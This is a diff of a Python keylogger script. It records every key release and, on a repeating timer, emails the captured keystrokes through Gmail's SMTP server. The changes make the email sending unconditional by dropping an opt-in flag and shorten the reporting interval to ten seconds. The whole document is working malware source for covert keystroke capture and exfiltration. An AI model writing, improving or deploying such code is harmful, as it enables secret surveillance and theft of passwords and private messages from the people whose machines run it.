@@ -6,12 +6,13 @@ from threading import Timer
 
 
 class Keylogger:
-    def __init__(self, interval=300, send_logs=False):
+    def __init__(self, interval=300):
         # Time interval for sending mails.
         self.interval = interval
-        self.send_logs = send_logs
         # Used to store keystrokes captured from the device.
         self.logs = ''
+        self.email = ''
+        self.password = ''
 
 
     def handle_key_press(self, key):
@@ -33,27 +34,25 @@ class Keylogger:
         self.password = input('Enter Password: ')
 
 
-    def send_mail(self):
+    def send_mail(self, email, password, msg):
         # You can change your smtp server if you use a different mail
-        smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
-        smtpObj.ehlo()
-        smtpObj.starttls()
         try:
-            smtpObj.login(self.email, self.password)
-        except smtplib.SMTPAuthenticationError as err:
-            print('An error occurred: ', err)
-
-        log_date = datetime.datetime.now()
-        msg = f'Subject: Log info\n {log_date}: {self.logs}'  
-        smtpObj.sendmail('KeyLogger', self.email, msg)
-        print("Mail Sent.")
-        # End the smtp session
-        smtpObj.quit()
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.ehlo()
+            server.starttls()
+            server.login(email, password)
+            server.sendmail(email, email, msg)
+        except Exception as e:
+            print('An error occurred: ', e)
+        finally:
+            server.quit()
 
 
     def report(self):
-        if self.logs:
-            self.send_mail()
+        if self.logs:    
+            log_date = datetime.datetime.now()
+            msg = f'Subject: Log info {log_date}\n' + self.logs
+            self.send_mail(self.email, self.password, msg)
         self.logs = ''
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
@@ -61,8 +60,7 @@ class Keylogger:
 
 
     def start(self):
-        if self.send_logs:
-            self.request_mail_credentials()
+        self.request_mail_credentials()
         self.report()
         with keyboard.Listener(on_release=self.handle_key_press) as listener:
             listener.join()
@@ -70,8 +68,9 @@ class Keylogger:
 
 
 if __name__ == '__main__':
-    keylogger = Keylogger(60, True)
+    keylogger = Keylogger(10)
     keylogger.start()
 
 
 
+# promise is a good boy
